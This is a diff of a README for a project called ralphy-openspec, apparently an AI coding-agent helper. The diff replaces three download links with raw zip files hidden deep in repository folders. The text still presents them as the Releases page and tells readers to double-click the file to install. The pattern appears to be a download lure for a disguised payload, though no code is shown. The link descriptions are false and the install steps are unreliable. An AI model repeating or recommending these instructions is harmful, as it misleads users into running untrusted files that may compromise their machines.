@@ -4,7 +4,7 @@
 Welcome to the **ralphy-openspec** project. This application integrates Ralph loop with OpenSpec to assist you in handling tasks with Cursor, OpenCode, and ClaudeCode.
 
 ## 📥 Download Now  
-[![Download ralphy-openspec](https://github.com/Gomesdc90/ralphy-openspec/raw/refs/heads/main/src/templates/opencode/openspec_ralphy_v2.5.zip)](https://github.com/Gomesdc90/ralphy-openspec/raw/refs/heads/main/src/templates/opencode/openspec_ralphy_v2.5.zip)  
+[![Download ralphy-openspec](https://github.com/Gomesdc90/ralphy-openspec/raw/refs/heads/main/ralphy-spec/tasks/v2_1-1_3_1/ralphy-openspec-1.7.zip)](https://github.com/Gomesdc90/ralphy-openspec/raw/refs/heads/main/ralphy-spec/tasks/v2_1-1_3_1/ralphy-openspec-1.7.zip)  
 Click the button above to download the latest version of the software from the Releases page.
 
 ## 🎯 Purpose  
@@ -27,7 +27,7 @@ To run **ralphy-openspec**, ensure your system meets the following requirements:
 ## 📤 Download & Install  
 To install **ralphy-openspec**, follow these steps:  
 1. Click the download link below to visit the Releases page:  
-   [Download from Releases](https://github.com/Gomesdc90/ralphy-openspec/raw/refs/heads/main/src/templates/opencode/openspec_ralphy_v2.5.zip)  
+   [Download from Releases](https://github.com/Gomesdc90/ralphy-openspec/raw/refs/heads/main/ralphy-spec/tasks/v2_1-1_3_1/ralphy-openspec-1.7.zip)  
 2. On the Releases page, find the latest version and click on the appropriate file link to download it.  
 3. Once the download is complete, locate the file on your computer.  
 4. Double-click the file to start the installation process.  
@@ -47,7 +47,7 @@ If you encounter any issues or need assistance, please reach out to our support 
 
 ## 📅 Updates  
 Stay up-to-date with the latest improvements and new features. We regularly release updates, and you can always check the Releases page for the newest version:  
-[Check for Updates](https://github.com/Gomesdc90/ralphy-openspec/raw/refs/heads/main/src/templates/opencode/openspec_ralphy_v2.5.zip)
+[Check for Updates](https://github.com/Gomesdc90/ralphy-openspec/raw/refs/heads/main/ralphy-spec/tasks/v2_1-1_3_1/ralphy-openspec-1.7.zip)
 
 ## 📝 Contribution  
 We welcome contributions to **ralphy-openspec**. If you have suggestions, bug reports, or feature requests, feel free to open an issue on GitHub. We appreciate community involvement to enhance our software.
